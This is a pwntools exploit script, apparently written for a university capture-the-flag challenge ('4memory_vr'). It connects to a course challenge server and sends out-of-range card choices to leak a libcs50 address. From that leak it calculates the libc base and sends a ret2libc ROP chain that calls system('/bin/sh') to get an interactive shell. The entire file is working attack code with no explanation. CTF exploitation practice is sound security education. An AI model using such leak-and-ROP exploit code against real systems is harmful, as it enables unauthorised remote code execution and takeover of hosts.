from pwn import * 

binary = "./4memory_vr"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
libcs = ELF('./libcs50.so')

libc = ELF('./libc.so.6')
r = ROP(libc)

p = remote("cse4850-bin11.chals.io", 443, ssl=True, sni="cse4850-bin11.chals.io")

p.recvuntil(b'Choice: ')
p.sendline(b'F')

p.recvuntil(b'Pick first card (row, column): ')
p.sendline(b'1337, 31337')

p.recvuntil(b'Pick second card (row, column): ')
p.sendline(b'31337, 1337')

p.recvuntil(b'Enjoy this nice treat: ')
remote_get = int(p.recvline(), 16)

local_get = libcs.sym['get_long_long']

print(hex(local_get))
print(hex(remote_get))

# libcs offset
offset_cs50 = remote_get - local_get

print(hex(offset_cs50))

ldd_cs50 = int(0x00007f89306ea000)
ldd_libc = int(0x00007f8930509000)

# libc offset (difference between libc and libcs50
offset_libc = ldd_cs50 - ldd_libc

print(offset_libc)

# libc base address of running program
base = offset_cs50 - offset_libc

print(base)

p.recvuntil(b'>>> ')

chain = cyclic(56)
chain += p64(base + r.find_gadget(['ret'])[0])
chain += p64(base + r.find_gadget(['pop rdi','ret'])[0])
chain += p64(base + next(libc.search(b'/bin/sh')))
chain += p64(base + libc.sym['system'])

p.sendline(chain)
p.interactive()
